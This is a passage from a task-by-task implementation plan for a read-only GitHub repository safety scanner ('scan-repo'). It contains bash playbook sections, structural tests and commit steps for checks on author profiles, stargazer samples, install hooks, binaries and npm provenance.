    [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
    repo_count=$((repo_count + 1))
    warns=$(count_warns_for_url "$line")
    justified=$(count_justified_for_url "$line")
    unjustified=$((warns - justified))
    [[ "$unjustified" -lt 0 ]] && unjustified=0
    if [[ "$unjustified" -gt 0 ]]; then
        printf 'calibration: %s — %d unjustified warn(s)\n' "$line" "$unjustified"
    fi
    total_unjustified=$((total_unjustified + unjustified))
done < "$GOOD_LIST"

printf 'calibration: %d repos checked, %d total unjustified warn(s) (threshold: %d)\n' \
    "$repo_count" "$total_unjustified" "$THRESHOLD"

if [[ "$total_unjustified" -ge "$THRESHOLD" ]]; then
    echo 'calibration: FAIL — threshold exceeded' >&2
    exit 1
fi

echo 'calibration: PASS'
exit 0
```

- [ ] **Step 4: Make executable and run tests**

Run:
```bash
chmod +x e:/GIT/repoguard/tools/calibration-check.sh
bash e:/GIT/repoguard/tests/test-calibration.sh
```
Expected: 4 PASS.

- [ ] **Step 5: Commit**

```bash
cd e:/GIT/repoguard && git add tools/calibration-check.sh tests/test-calibration.sh && git commit -m "feat(calibration): check script with --dry-run and tests"
```

---

### Task 11: Pre-commit hook installer

**Files:**
- Create: `e:/GIT/repoguard/tools/install-hooks.sh`

- [ ] **Step 1: Write the installer**

Create `e:/GIT/repoguard/tools/install-hooks.sh`:
```bash
#!/usr/bin/env bash
# Install the calibration pre-commit hook. Idempotent.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK_DIR="$REPO_ROOT/.git/hooks"
HOOK_FILE="$HOOK_DIR/pre-commit"

if [[ ! -d "$REPO_ROOT/.git" ]]; then
    echo "install-hooks: not a git repo (no .git at $REPO_ROOT)" >&2
    exit 1
fi

mkdir -p "$HOOK_DIR"

cat > "$HOOK_FILE" <<'HOOK_EOF'
#!/usr/bin/env bash
# scan-repo pre-commit gate: if SKILL.md or helpers.sh changes, calibration must pass.
set -euo pipefail

REPO_ROOT="$(git rev-parse --show-toplevel)"
CHANGED="$(git diff --cached --name-only)"

if echo "$CHANGED" | grep -qE '^skill/SKILL\.md$|^tools/helpers\.sh$'; then
    echo 'pre-commit: SKILL.md or helpers.sh changed — running calibration check…'
    if ! "$REPO_ROOT/tools/calibration-check.sh"; then
        echo 'pre-commit: calibration check failed; commit blocked.' >&2
        echo '            Either tune SKILL.md or update justified-warns.md.' >&2
        exit 1
    fi
fi

exit 0
HOOK_EOF

chmod +x "$HOOK_FILE"
echo "install-hooks: installed $HOOK_FILE"
```

- [ ] **Step 2: Make executable, run, verify**

```bash
chmod +x e:/GIT/repoguard/tools/install-hooks.sh
bash e:/GIT/repoguard/tools/install-hooks.sh
ls -la e:/GIT/repoguard/.git/hooks/pre-commit
```
Expected: file exists, executable.

- [ ] **Step 3: Commit the installer**

```bash
cd e:/GIT/repoguard && git add tools/install-hooks.sh && git commit -m "feat(tooling): pre-commit hook installer wires calibration check"
```

---

## Phase 3: Slash command

### Task 12: Slash command body

**Files:**
- Create: `e:/GIT/repoguard/skill/scan-repo.command.md`

**Decision gate:** if Task 3 passed, use the in-band token form. If failed, use the CLI-arg fallback (commented below).

- [ ] **Step 1: Write the slash command body**

Create `e:/GIT/repoguard/skill/scan-repo.command.md`:
```markdown
Run the scan-repo skill on the URL: {{args}}.

**Invocation mode: explicit — run full audit, skip the quick-check tier.**

If no URL was provided, print:

    Usage: /scan-repo <github-url>
    Example: /scan-repo https://github.com/anthropics/claude-code

and do not invoke the skill.
```

(Fallback form, only if Task 3 FAILED:
```
Run the scan-repo skill with arg `--mode explicit` on URL: {{args}}.

If no URL was provided, print usage and do not invoke the skill.
```)

- [ ] **Step 2: Structural check**

```bash
grep -F "Invocation mode: explicit" e:/GIT/repoguard/skill/scan-repo.command.md
grep -F "{{args}}" e:/GIT/repoguard/skill/scan-repo.command.md
```
Expected: both lines print a match.

- [ ] **Step 3: Commit**

```bash
cd e:/GIT/repoguard && git add skill/scan-repo.command.md && git commit -m "feat(skill): slash command body for /scan-repo"
```

---

## Phase 4: SKILL.md (the playbook)

### Task 13: SKILL.md frontmatter and structural test scaffold

**Files:**
- Create: `e:/GIT/repoguard/skill/SKILL.md`
- Create: `e:/GIT/repoguard/tests/test-skill-structure.sh`

- [ ] **Step 1: Write SKILL.md frontmatter and intro**

Create `e:/GIT/repoguard/skill/SKILL.md`:
```markdown
---
name: scan-repo
description: |
  Use when the user has expressed intent to install, clone, run, try, test, or use a specific
  github.com repository, OR when they explicitly ask whether a github repo is safe / trustworthy
  ("should I install this?", "is it safe to use?", "thoughts on this repo?", "can I trust …").
  Performs a quick safety scan (5–10s, 3 cheapest checks) by default; surfaces findings as a
  soft, deflating verdict line. The /scan-repo slash command runs the full audit instead.

  Do NOT use when the user is merely sharing a github URL for context, asking about an issue
  or PR thread, referencing docs or a specific file in a repo for code reading, or discussing
  a repo without install intent.

  If scan-repo has already been invoked on the same owner/repo earlier in the conversation,
  reference the prior result inline instead of re-running.
---

# scan-repo

Audits a github.com repo for safety signals before the user installs it.
Read-only — never clones, never executes anything from the target repo.

**Audience:** vibe coders. The skill is the agent's pre-flight check;
the user does not read the findings directly. The agent interprets and
explains them in the next turn.

**Output is a soft, deflating verdict** — never a hard "SAFE" /
"MALICIOUS" call. The verdict label always carries its own caveat in
the wording. See §Verdict & output below.
```

- [ ] **Step 2: Write the structural test**

Create `e:/GIT/repoguard/tests/test-skill-structure.sh`:
```bash
#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/test-framework.sh"

SKILL="$SCRIPT_DIR/../skill/SKILL.md"

assert_true "grep -q '^name: scan-repo$' '$SKILL'" \
    "skill: name in frontmatter"
assert_true "grep -q '^description:' '$SKILL'" \
    "skill: description present"
assert_true "grep -q 'install, clone, run, try, test, or use' '$SKILL'" \
    "skill: description names intent tokens"
assert_true "grep -q 'Do NOT use' '$SKILL'" \
    "skill: description has anti-trigger guidance"
assert_true "grep -q 'reference the prior result' '$SKILL'" \
    "skill: description mentions memoization"

report
```

- [ ] **Step 3: Run, expect pass**

```bash
chmod +x e:/GIT/repoguard/tests/test-skill-structure.sh
bash e:/GIT/repoguard/tests/test-skill-structure.sh
```
Expected: 5 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): SKILL.md frontmatter + structural test"
```

---

### Task 14: Layered gating playbook

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append layered-gating section**

Append to `skill/SKILL.md`:
```markdown

## Setup

Source the helpers:

\`\`\`bash
HELPERS="${SCAN_REPO_HELPERS:-$HOME/.claude/skills/scan-repo/helpers.sh}"
[[ -f "$HELPERS" ]] || { echo "scan-repo: helpers.sh not found — run tools/install.sh" >&2; exit 1; }
source "$HELPERS"
\`\`\`

## Layered gating (run on every invocation)

### Step 0 — URL extraction

\`\`\`bash
TARGET="$(extract_url "$INPUT")"
[[ -z "$TARGET" ]] && exit 0
OWNER_REPO="${TARGET%@*}"
BRANCH="${TARGET##*@}"
[[ "$BRANCH" == "$OWNER_REPO" ]] && BRANCH=""
\`\`\`

### Step 1 — Mode dispatch

\`\`\`bash
MODE="quick"
if echo "$INPUT" | grep -qF "Invocation mode: explicit"; then
    MODE="full"
fi
\`\`\`

### Step 2 — Intent gate (quick mode only)

\`\`\`bash
if [[ "$MODE" == "quick" ]] && ! has_intent_token "$INPUT"; then
    exit 0
fi
\`\`\`

### Step 3 — Memoization check

Claude-side responsibility: check conversation history for prior
scan-repo activity on `{OWNER_REPO}@{BRANCH}`. If found, emit:

> *(scan-repo already ran a quick check on github.com/{OWNER_REPO} earlier in this conversation — verdict was [🟢|🟡]. For full audit run /scan-repo {URL})*

or

> *(scan-repo already ran a full audit on github.com/{OWNER_REPO} earlier in this conversation — verdict was [🟢|🟡|🔴|⚪]. See prior message for findings.)*

…and exit. Memoization is best-effort — after context compaction the
prior result may be invisible.

### Branch resolution

\`\`\`bash
[[ -z "$BRANCH" ]] && BRANCH="$(gh api "repos/$OWNER_REPO" --jq .default_branch)"
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report` in `tests/test-skill-structure.sh`:
```bash
assert_true "grep -q '## Layered gating' '$SKILL'" \
    "skill: layered gating section"
assert_true "grep -q 'Step 0 — URL extraction' '$SKILL'" \
    "skill: gate step 0"
assert_true "grep -q 'Step 1 — Mode dispatch' '$SKILL'" \
    "skill: gate step 1"
assert_true "grep -q 'Step 2 — Intent gate' '$SKILL'" \
    "skill: gate step 2"
assert_true "grep -q 'Step 3 — Memoization' '$SKILL'" \
    "skill: gate step 3"
assert_true "grep -qF 'Invocation mode: explicit' '$SKILL'" \
    "skill: explicit-mode token referenced"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 11 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): layered gating playbook (steps 0-3)"
```

---

### Task 15: Ecosystem detection

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append ecosystem detection**

Append to `skill/SKILL.md`:
```markdown

## Ecosystem detection

\`\`\`bash
ROOT_TREE_JSON="$(gh api "repos/$OWNER_REPO/git/trees/$BRANCH?recursive=0")"
ROOT_FILES="$(echo "$ROOT_TREE_JSON" | jq -r '.tree[] | select(.type == "blob") | .path')"

ECOSYSTEMS=""
MARKERS=""
add_marker() { MARKERS="$MARKERS $1"; }
for f in $ROOT_FILES; do
    case "$f" in
        package.json)        ECOSYSTEMS="$ECOSYSTEMS node";   add_marker "package.json" ;;
        pyproject.toml|setup.py|setup.cfg|requirements.txt)
                             ECOSYSTEMS="$ECOSYSTEMS python"; add_marker "$f" ;;
        Cargo.toml)          ECOSYSTEMS="$ECOSYSTEMS rust";   add_marker "Cargo.toml" ;;
        go.mod)              ECOSYSTEMS="$ECOSYSTEMS go";     add_marker "go.mod" ;;
        Gemfile)             ECOSYSTEMS="$ECOSYSTEMS ruby";   add_marker "Gemfile" ;;
        pom.xml|build.gradle*) ECOSYSTEMS="$ECOSYSTEMS jvm";  add_marker "$f" ;;
        composer.json)       ECOSYSTEMS="$ECOSYSTEMS php";    add_marker "composer.json" ;;
        Makefile|build.sh|webpack.config.*|vite.config.*|rollup.config.*)
                             add_marker "$f" ;;
    esac
done
ECOSYSTEMS="$(echo "$ECOSYSTEMS" | xargs -n1 | sort -u | xargs)"
[[ -z "$ECOSYSTEMS" ]] && ECOSYSTEMS="none"
\`\`\`
```

- [ ] **Step 2: Append test**

Insert before `report`:
```bash
assert_true "grep -q '## Ecosystem detection' '$SKILL'" \
    "skill: ecosystem detection section"
assert_true "grep -q 'Cargo.toml' '$SKILL'" \
    "skill: ecosystem detection includes Rust"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 13 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): ecosystem detection step"
```

---

### Task 16: Quick-check tier playbook

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append the quick-check tier**

Append to `skill/SKILL.md`:
```markdown

## Quick-check tier (MODE=quick)

Three checks. Tighter thresholds than the full audit.

### Q1 — Author profile

\`\`\`bash
AUTHOR_JSON="$(gh api "users/${OWNER_REPO%%/*}")"
AUTHOR_CREATED="$(echo "$AUTHOR_JSON" | jq -r .created_at)"
AUTHOR_REPOS="$(echo "$AUTHOR_JSON"   | jq -r .public_repos)"

age=$(age_days "$AUTHOR_CREATED")

Q1_RESULT=pass
Q1_EVIDENCE="Author account ${age}d old, ${AUTHOR_REPOS} other repo(s)"
if [[ "$age" -lt 30 && "$AUTHOR_REPOS" -lt 3 ]]; then
    Q1_RESULT=warn
fi
\`\`\`

### Q2 — Repo basics

\`\`\`bash
REPO_JSON="$(gh api "repos/$OWNER_REPO")"
REPO_CREATED="$(echo "$REPO_JSON" | jq -r .created_at)"
REPO_STARS="$(echo "$REPO_JSON"   | jq -r .stargazers_count)"
ARCHIVED="$(echo "$REPO_JSON"     | jq -r .archived)"
DISABLED="$(echo "$REPO_JSON"     | jq -r .disabled)"

repo_age=$(age_days "$REPO_CREATED")
[[ "$repo_age" -lt 1 ]] && repo_age=1
stars_per_day=$(( REPO_STARS / repo_age ))

Q2_RESULT=pass
Q2_EVIDENCE="Repo ${repo_age}d old, ${REPO_STARS} stars (${stars_per_day}/day avg)"
if [[ "$ARCHIVED" == "true" || "$DISABLED" == "true" ]]; then
    Q2_RESULT=warn
    Q2_EVIDENCE="Repo is archived/disabled — no longer maintained"
elif [[ "$repo_age" -lt 14 && "$stars_per_day" -gt 500 ]]; then
    Q2_RESULT=warn
    Q2_EVIDENCE="${REPO_STARS} stars in ${repo_age}d (${stars_per_day}/day) — unusually fast"
fi
\`\`\`

### Q6 — Install hook presence + allowlist

\`\`\`bash
fetch_raw() {
    local file="$1"
    curl --max-time 10 --max-filesize 1048576 --fail-with-body -sL \
        "https://raw.githubusercontent.com/$OWNER_REPO/$BRANCH/$file" 2>/dev/null
}

Q6_RESULT=pass
Q6_EVIDENCE="No install hooks found"
Q6_FOUND_ANY=0

if echo " $ECOSYSTEMS " | grep -q ' node '; then
    PKG_JSON="$(fetch_raw package.json)"
    if [[ -n "$PKG_JSON" ]]; then
        for hook_name in preinstall install postinstall; do
            hook="$(echo "$PKG_JSON" | jq -r ".scripts.$hook_name // empty")"
            if [[ -n "$hook" ]]; then
                Q6_FOUND_ANY=1
                if ! is_benign_install_hook "$hook"; then
                    Q6_RESULT=warn
                    Q6_EVIDENCE="package.json $hook_name not on benign allowlist: \"$hook\""
                fi
            fi
        done
    fi
fi

if [[ "$Q6_FOUND_ANY" -eq 1 && "$Q6_RESULT" == "pass" ]]; then
    Q6_EVIDENCE="Install hook(s) present, all on benign allowlist"
fi
\`\`\`

### Quick-check verdict and output

\`\`\`bash
Q_WARNS=0
for r in "$Q1_RESULT" "$Q2_RESULT" "$Q6_RESULT"; do
    [[ "$r" == "warn" ]] && Q_WARNS=$((Q_WARNS+1))
done

VERDICT_COLOR="$(compute_verdict 0 "$Q_WARNS" 0)"

if [[ "$VERDICT_COLOR" == "green" ]]; then
    echo "[scan-repo 🟢 nothing obviously wrong (3 quick checks) — proceed if you trust the source. For full audit run /scan-repo https://github.com/$OWNER_REPO]"
else
    summary=""
    [[ "$Q1_RESULT" == "warn" ]] && summary="$Q1_EVIDENCE"
    [[ -z "$summary" && "$Q2_RESULT" == "warn" ]] && summary="$Q2_EVIDENCE"
    [[ -z "$summary" && "$Q6_RESULT" == "warn" ]] && summary="$Q6_EVIDENCE"
    echo "[scan-repo 🟡 a few things look unusual — $summary. Worth running /scan-repo https://github.com/$OWNER_REPO for the full audit (~30s) before installing.]"
fi

exit 0
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report`:
```bash
assert_true "grep -q '## Quick-check tier' '$SKILL'" \
    "skill: quick-check tier section"
assert_true "grep -q '### Q1 — Author profile' '$SKILL'" \
    "skill: Q1 quick check"
assert_true "grep -q '### Q2 — Repo basics' '$SKILL'" \
    "skill: Q2 quick check"
assert_true "grep -q '### Q6 — Install hook' '$SKILL'" \
    "skill: Q6 quick check"
assert_true "grep -qF 'is_benign_install_hook' '$SKILL'" \
    "skill: Q6 calls benign allowlist helper"
assert_true "grep -qF '🟢 nothing obviously wrong' '$SKILL'" \
    "skill: quick-check green verdict line"
assert_true "grep -qF '🟡 a few things look unusual' '$SKILL'" \
    "skill: quick-check yellow verdict line"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 20 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): quick-check tier (Q1, Q2, Q6 + verdict)"
```

---

### Task 17: Full audit checks 1, 2, 4, 5

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append the section**

Append to `skill/SKILL.md`:
```markdown

## Full audit (MODE=full)

Initialise accumulators:

\`\`\`bash
WARNS=0
HC_WARNS=0
SKIPS=0
declare -a FINDINGS
\`\`\`

### Check 1 — Author profile (full)

\`\`\`bash
AUTHOR_JSON="$(gh api "users/${OWNER_REPO%%/*}")"
AUTHOR_CREATED="$(echo "$AUTHOR_JSON" | jq -r .created_at)"
AUTHOR_REPOS="$(echo "$AUTHOR_JSON"   | jq -r .public_repos)"
AUTHOR_FOLLOWERS="$(echo "$AUTHOR_JSON" | jq -r .followers)"
age=$(age_days "$AUTHOR_CREATED")

if [[ "$age" -lt 30 || "$AUTHOR_REPOS" -lt 3 || "$AUTHOR_FOLLOWERS" -eq 0 ]]; then
    WARNS=$((WARNS+1))
    FINDINGS+=("⚠ Author account created ${age} days ago, ${AUTHOR_REPOS} other repo(s), ${AUTHOR_FOLLOWERS} followers")
    FINDINGS+=("     https://github.com/${OWNER_REPO%%/*}")
else
    FINDINGS+=("✓ Author has established history (${age}d account, ${AUTHOR_REPOS} repos, ${AUTHOR_FOLLOWERS} followers)")
fi
\`\`\`

### Check 2 — Repo basics (full)

\`\`\`bash
REPO_JSON="$(gh api "repos/$OWNER_REPO")"
REPO_CREATED="$(echo "$REPO_JSON" | jq -r .created_at)"
REPO_STARS="$(echo "$REPO_JSON"   | jq -r .stargazers_count)"
REPO_FORKS="$(echo "$REPO_JSON"   | jq -r .forks_count)"
REPO_OPEN_ISSUES="$(echo "$REPO_JSON" | jq -r .open_issues_count)"
ARCHIVED="$(echo "$REPO_JSON" | jq -r .archived)"
DISABLED="$(echo "$REPO_JSON" | jq -r .disabled)"

repo_age=$(age_days "$REPO_CREATED")
[[ "$repo_age" -lt 1 ]] && repo_age=1
stars_per_day=$(( REPO_STARS / repo_age ))

if [[ "$ARCHIVED" == "true" || "$DISABLED" == "true" ]]; then
    WARNS=$((WARNS+1))
    FINDINGS+=("⚠ Repo is archived/disabled — no longer maintained")
elif [[ "$repo_age" -lt 14 && "$stars_per_day" -gt 200 ]]; then
    WARNS=$((WARNS+1))
    FINDINGS+=("⚠ ${REPO_STARS} stars in ${repo_age}d (${stars_per_day}/day) — unusually fast for a young repo")
else
    age_human=$(printf '%dy %dm' $((repo_age/365)) $(( (repo_age%365)/30 )))
    FINDINGS+=("✓ Repo age: ${age_human} (${REPO_STARS} stars, ${REPO_FORKS} forks)")
fi
\`\`\`

### Check 4 — Activity ratios

\`\`\`bash
CONTRIBUTORS_LINK="$(gh api -i "repos/$OWNER_REPO/contributors?per_page=1" 2>/dev/null | grep -i '^link:' | head -1)"
TOTAL_CONTRIBUTORS=1
if [[ "$CONTRIBUTORS_LINK" =~ \&page=([0-9]+)\>\;\ rel=\"last\" ]]; then
    TOTAL_CONTRIBUTORS="${BASH_REMATCH[1]}"
fi

if [[ "$REPO_STARS" -gt 5000 && "$TOTAL_CONTRIBUTORS" -le 2 && "$REPO_OPEN_ISSUES" -eq 0 ]]; then
    WARNS=$((WARNS+1))
    FINDINGS+=("⚠ ${REPO_STARS} stars but only ${TOTAL_CONTRIBUTORS} contributor(s) and 0 open issues — unusual for a popular repo")
else
    FINDINGS+=("✓ Activity: ${TOTAL_CONTRIBUTORS} contributor(s), ${REPO_OPEN_ISSUES} open issues")
fi
\`\`\`

### Check 5 — Star history link

\`\`\`bash
FINDINGS+=("— Star history (eyeball): https://star-history.com/#${OWNER_REPO}&Date")
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report`:
```bash
assert_true "grep -q '## Full audit' '$SKILL'" \
    "skill: full audit section"
assert_true "grep -q '### Check 1 — Author profile (full)' '$SKILL'" \
    "skill: full check 1"
assert_true "grep -q '### Check 2 — Repo basics (full)' '$SKILL'" \
    "skill: full check 2"
assert_true "grep -q '### Check 4 — Activity ratios' '$SKILL'" \
    "skill: full check 4"
assert_true "grep -q '### Check 5 — Star history link' '$SKILL'" \
    "skill: full check 5"
assert_true "grep -q 'star-history.com' '$SKILL'" \
    "skill: star-history URL emitted"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 26 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): full audit checks 1, 2, 4, 5"
```

---

### Task 18: Full audit check 3 (stargazer dual-page)

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append check 3**

Append to `skill/SKILL.md`:
```markdown

### Check 3 — Stargazer sample (dual-page)

\`\`\`bash
if [[ "$REPO_STARS" -lt 50 ]]; then
    SKIPS=$((SKIPS+1))
    FINDINGS+=("· Stargazer sample skipped — repo has only ${REPO_STARS} stars")
else
    PER_PAGE=20
    LAST_PAGE=$(( (REPO_STARS + PER_PAGE - 1) / PER_PAGE ))
    [[ "$LAST_PAGE" -lt 2 ]] && LAST_PAGE=2
    MID_PAGE=$(( RANDOM % (LAST_PAGE - 1) + 2 ))

    sample_one_page() {
        local page="$1"
        gh api "repos/$OWNER_REPO/stargazers?per_page=$PER_PAGE&page=$page" \
            | jq -r '.[].login'
    }

    PAGE1_LOGINS="$(sample_one_page 1)"
    PAGEN_LOGINS="$(sample_one_page "$MID_PAGE")"

    classify_login() {
        local login="$1"
        local user_json
        user_json="$(gh api "users/$login" 2>/dev/null)" || { echo ok; return; }
        local created followers repos
        created="$(echo "$user_json" | jq -r .created_at)"
        followers="$(echo "$user_json" | jq -r .followers)"
        repos="$(echo "$user_json"    | jq -r .public_repos)"
        if is_empty_profile "$created" "$followers" "$repos"; then
            echo empty
        else
            echo ok
        fi
    }

    PAGE1_EMPTY=0; PAGE1_TOTAL=0
    for l in $PAGE1_LOGINS; do
        PAGE1_TOTAL=$((PAGE1_TOTAL+1))
        [[ "$(classify_login "$l")" == "empty" ]] && PAGE1_EMPTY=$((PAGE1_EMPTY+1))
    done
    PAGEN_EMPTY=0; PAGEN_TOTAL=0
    SAMPLE_LINKS=""
    sample_count=0
    for l in $PAGEN_LOGINS; do
        PAGEN_TOTAL=$((PAGEN_TOTAL+1))
        [[ "$(classify_login "$l")" == "empty" ]] && PAGEN_EMPTY=$((PAGEN_EMPTY+1))
        if [[ "$sample_count" -lt 3 ]]; then
            SAMPLE_LINKS="$SAMPLE_LINKS https://github.com/$l"
            sample_count=$((sample_count+1))
        fi
    done

    COMBINED_TOTAL=$((PAGE1_TOTAL + PAGEN_TOTAL))
    COMBINED_EMPTY=$((PAGE1_EMPTY + PAGEN_EMPTY))
    EMPTY_PCT=0
    [[ "$COMBINED_TOTAL" -gt 0 ]] && EMPTY_PCT=$(( COMBINED_EMPTY * 100 / COMBINED_TOTAL ))

    PAGE1_PCT=0; PAGEN_PCT=0
    [[ "$PAGE1_TOTAL" -gt 0 ]] && PAGE1_PCT=$(( PAGE1_EMPTY * 100 / PAGE1_TOTAL ))
    [[ "$PAGEN_TOTAL" -gt 0 ]] && PAGEN_PCT=$(( PAGEN_EMPTY * 100 / PAGEN_TOTAL ))

    if [[ "$EMPTY_PCT" -ge 50 ]]; then
        WARNS=$((WARNS+1))
        HC_WARNS=$((HC_WARNS+1))
        FINDINGS+=("⚠ ${EMPTY_PCT}% of sampled stargazers are empty profiles (${COMBINED_EMPTY}/${COMBINED_TOTAL}) — strong bot-star signal")
        FINDINGS+=("     Examples:$SAMPLE_LINKS")
    elif [[ "$EMPTY_PCT" -ge 30 ]] || { [[ "$PAGEN_PCT" -gt 0 ]] && [[ $((PAGE1_PCT * 10)) -gt $((PAGEN_PCT * 20)) ]]; }; then
        WARNS=$((WARNS+1))
        FINDINGS+=("⚠ ${EMPTY_PCT}% of sampled stargazers are empty profiles (recent-page rate ${PAGE1_PCT}%, random-page rate ${PAGEN_PCT}%)")
        FINDINGS+=("     Examples:$SAMPLE_LINKS")
    else
        FINDINGS+=("✓ Stargazer sample: ${EMPTY_PCT}% empty profiles (within normal range)")
    fi
fi
\`\`\`
```

- [ ] **Step 2: Append tests**

Insert before `report`:
```bash
assert_true "grep -q '### Check 3 — Stargazer sample' '$SKILL'" \
    "skill: full check 3"
assert_true "grep -q 'is_empty_profile' '$SKILL'" \
    "skill: check 3 calls is_empty_profile"
assert_true "grep -q 'HC_WARNS=\$((HC_WARNS+1))' '$SKILL'" \
    "skill: check 3 sets high-confidence on >=50% empty"
```

- [ ] **Step 3: Run tests**

Run: `bash e:/GIT/repoguard/tests/test-skill-structure.sh`
Expected: 29 PASS.

- [ ] **Step 4: Commit**

```bash
cd e:/GIT/repoguard && git add skill/SKILL.md tests/test-skill-structure.sh && git commit -m "feat(skill): full audit check 3 (dual-page stargazer sample)"
```

---

### Task 19: Full audit checks 6, 7, 8

**Files:**
- Modify: `e:/GIT/repoguard/skill/SKILL.md` (append)
- Modify: `e:/GIT/repoguard/tests/test-skill-structure.sh` (append before `report`)

- [ ] **Step 1: Append the three checks**

Append to `skill/SKILL.md`:
```markdown

### Check 6 — Install scripts (full)

\`\`\`bash
inspect_node_hooks() {
    local pkg="$1"
    [[ -z "$pkg" ]] && return
    for hook_name in preinstall install postinstall; do
        local hook
        hook="$(echo "$pkg" | jq -r ".scripts.$hook_name // empty")"
        [[ -z "$hook" ]] && continue
        if has_suspicious_pattern "$hook"; then
            WARNS=$((WARNS+1))
            HC_WARNS=$((HC_WARNS+1))
            FINDINGS+=("⚠ $hook_name script contains suspicious pattern (high confidence):")
            FINDINGS+=("     \"$hook\"")
            FINDINGS+=("     (file: package.json)")
        elif is_benign_install_hook "$hook"; then
            FINDINGS+=("✓ $hook_name on benign allowlist: \"$hook\"")
        else
            WARNS=$((WARNS+1))
            FINDINGS+=("⚠ $hook_name script not on benign allowlist:")
            FINDINGS+=("     \"$hook\"")
            FINDINGS+=("     (file: package.json)")
        fi
    done
}

CHECK6_RAN=0
if echo " $ECOSYSTEMS " | grep -q ' node '; then
    CHECK6_RAN=1
    PKG_JSON="$(fetch_raw package.json)"
    inspect_node_hooks "$PKG_JSON"
fi

if echo " $ECOSYSTEMS " | grep -q ' python '; then
    CHECK6_RAN=1
    SETUP_PY="$(fetch_raw setup.py)"
    if [[ -n "$SETUP_PY" ]] && has_suspicious_pattern "$SETUP_PY"; then
        WARNS=$((WARNS+1))
        HC_WARNS=$((HC_WARNS+1))
        FINDINGS+=("⚠ setup.py contains suspicious pattern (high confidence) — inspect manually")
    fi
fi

if [[ "$CHECK6_RAN" -eq 0 ]]; then
    SKIPS=$((SKIPS+1))
    FINDINGS+=("· Install-script check skipped — no Node/Python manifest in repo root")
fi

FINDINGS+=("       (note: transitive deps not scanned — known v1 limitation)")
\`\`\`

### Check 7 — Binaries in tree

\`\`\`bash
TREE_JSON="$(gh api "repos/$OWNER_REPO/git/trees/$BRANCH?recursive=1")"
BIN_FOUND=0
BIN_SHOWN=0
TOTAL_BIN_HITS=0

while IFS=$'\t' read -r path size; do
    [[ -z "$path" ]] && continue
    if is_forbidden_executable "$path"; then
        TOTAL_BIN_HITS=$((TOTAL_BIN_HITS+1))
        if is_in_recognized_build_path "$path" "$MARKERS"; then
            note=" (in conventional build output for this project)"
            HC_FLAG=0
        else
            note=""
            HC_FLAG=1
        fi
        WARNS=$((WARNS+1))
        [[ "$HC_FLAG" -eq 1 ]] && HC_WARNS=$((HC_WARNS+1))
        if [[ "$BIN_SHOWN" -lt 5 ]]; then
            FINDINGS+=("⚠ Forbidden executable in tree: $path$note")
            BIN_SHOWN=$((BIN_SHOWN+1))
        fi
        BIN_FOUND=1
    fi
done < <(echo "$TREE_JSON" \
    | jq -r '.tree[] | select(.type == "blob") | "\(.path)\t\(.size // 0)"')

if [[ "$BIN_FOUND" -eq 1 && "$BIN_SHOWN" -lt "$TOTAL_BIN_HITS" ]]; then
    FINDINGS+=("     (… and $((TOTAL_BIN_HITS - BIN_SHOWN)) more — list with: gh api repos/$OWNER_REPO/git/trees/$BRANCH?recursive=1)")
fi
[[ "$BIN_FOUND" -eq 0 ]] && FINDINGS+=("✓ No forbidden executables in tree")
\`\`\`

### Check 8 — Provenance

\`\`\`bash
CHECK8_RAN=0

if echo " $ECOSYSTEMS " | grep -q ' node ' && [[ -n "${PKG_JSON:-}" ]]; then
    CHECK8_RAN=1
    NPM_NAME="$(echo "$PKG_JSON" | jq -r '.name // empty')"
    if [[ -n "$NPM_NAME" ]]; then
        NPM_JSON="$(curl --max-time 10 --max-filesize 1048576 --fail-with-body -sL \
            "https://registry.npmjs.org/$NPM_NAME" 2>/dev/null)"
        if [[ -n "$NPM_JSON" ]]; then
            MAINTAINERS="$(echo "$NPM_JSON" | jq -r '.maintainers[]?.name' | sort -u)"
            CONTRIBS="$(gh api "repos/$OWNER_REPO/contributors?per_page=30" \
                        | jq -r '.[].login' | sort -u)"
            OWNER="${OWNER_REPO%%/*}"
            OVERLAP=0
            for m in $MAINTAINERS; do
                [[ "$m" == "$OWNER" ]] && OVERLAP=1 && break
